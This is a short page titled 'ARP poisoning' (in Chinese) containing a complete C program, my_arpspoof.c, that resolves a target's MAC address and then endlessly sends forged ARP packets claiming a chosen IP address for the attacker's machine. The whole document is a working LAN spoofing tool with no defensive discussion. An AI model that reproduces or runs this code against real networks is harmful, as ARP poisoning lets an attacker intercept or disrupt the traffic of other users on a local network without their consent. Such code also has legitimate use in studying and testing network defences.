# ARP 投毒



```
/*************************************************************************
	> File Name: my_arpspoof.c
	> Author: Jung
	> Mail: jungzhang@xiyoulinux.org
	> Created Time: 2016年08月02日 星期二 08时02分14秒
	> Description:
 ************************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <unistd.h>

//获取本机MAC地址，存入mac数组中，要求传入网卡名字
int getMacAddr(unsigned char mac[], const char name[])
{
    struct ifreq ethinfo;
    int sock_fd;

    if (name == NULL || mac == NULL) {
        return -1;
    }

    if ((sock_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Open Socket");
        return -1;
    }

    strcpy(ethinfo.ifr_name, name);

    if (ioctl(sock_fd, SIOCGIFHWADDR, &ethinfo) < 0) {
        perror("Ioctl");
        return -1;
    }

    for (int i = 0; i < 6; ++i) {
        mac[i] = (unsigned char)ethinfo.ifr_hwaddr.sa_data[i];
    }

    close(sock_fd);

    return 1;
}

//构建ARP数据包
void packarp(char *mymac, char *tarmac, int *tarip, int *myip, char *opcode, char *arppack)
{
    char eth_type[2] = {0x00,0x01};   //硬件类型,以太网为1
    char por_type[2] = {0x08,0x00};     //ARP正在使用的上层协议类型,这里是IP协议
    char type[2] = {0x08, 0x06};        //帧类型,0x0806表示ARP
    char eth_length = 6;        //硬件地址长度
    char por_length = 4;        //协议地址长度，这里指IP协议

    memset(arppack, 0, 42);                 //清空发送缓存区
    memcpy(arppack, tarmac, 6);             //6个字节表示目标主机的mac地址
    memcpy(arppack + 6, mymac, 6);          //6个字节表示源主机的mac地址
    memcpy(arppack + 12, type, 2);         //帧类型,这里表示ARP
    memcpy(arppack + 14, eth_type, 2);    //硬件地址,这里表示以太网
    memcpy(arppack + 16, por_type, 2);      //ARP正在使用的上层协议
    memcpy(arppack + 18, &eth_length, 1);   //硬件地址长度
    memcpy(arppack + 19, &por_length, 1);   //协议地址长度
    memcpy(arppack + 20, opcode, 2);        //标记是ARP还是ARP应答
    memcpy(arppack + 22, mymac, 6);          //发送者MAC地址
    memcpy(arppack + 28, myip, 4);          //发送者IP
    if (!(opcode[0] == 0x00 && opcode[1] == 0x01)) {
        memcpy(arppack + 32, tarmac, 6);        //目标MAC地址
    }
    memcpy(arppack + 38, tarip, 4);         //目标IP地址
}

int main(int argc, char *argv[])
{
    unsigned char mymac[6] = {0};
    unsigned char tarmac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    char recvarp[42] = {0};
    char sendarp[42] = {0};
    int tarip;
    int myip;
    char opcode[2];
    int sock_fd;
    struct sockaddr addr;

    if (argc < 4) {
        return EXIT_FAILURE;
    }

    //获取本机MAC地址
    if (getMacAddr(mymac, argv[1]) < 0) {
        printf("获取MAC地址失败\n");
        return EXIT_FAILURE;
    }

    myip = inet_addr(argv[3]);
    tarip = inet_addr(argv[2]);
    opcode[0] = 0x00;
    opcode[1] = 0x01;

    packarp((char*)mymac, (char*)tarmac, &tarip, &myip, opcode, sendarp);

    if ((sock_fd = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ARP))) < 0) {
        perror("Open Socket");
        return EXIT_FAILURE;
    }

    memset(&addr, 0, sizeof(addr));
    strncpy(addr.sa_data, argv[1], sizeof(addr.sa_data));
    socklen_t len = sizeof(addr);


    while(1) {
        if (sendto(sock_fd, sendarp, 42, 0, &addr, len) == 42) {
            printf("发送ARP包成功\n");
        } else {
            perror("sendto");
            return EXIT_FAILURE;
        }

        if (recvfrom(sock_fd, recvarp, 42, 0, &addr, &len) == 42) {
            if (!memcmp((char *)recvarp + 28, (char *)sendarp + 38, 4)) {
                memcpy(tarmac, recvarp + 22, 6);
                printf("获取MAC地址成功\n");
                break;
            }
        }

        sleep(1);
    }

    opcode[0] = 0x00;
    opcode[1] = 0x01;
    packarp((char*)mymac, (char*)tarmac, &tarip, &myip, opcode, sendarp);

    while(1) {
        if (sendto(sock_fd, sendarp, 42, 0, &addr, len) == 42) {
            printf("发送ARP欺骗包成功\n");
        } else {
            perror("sendto");
            return EXIT_FAILURE;
        }
        sleep(1);
    }

    close(sock_fd);

    return EXIT_SUCCESS;
}

```
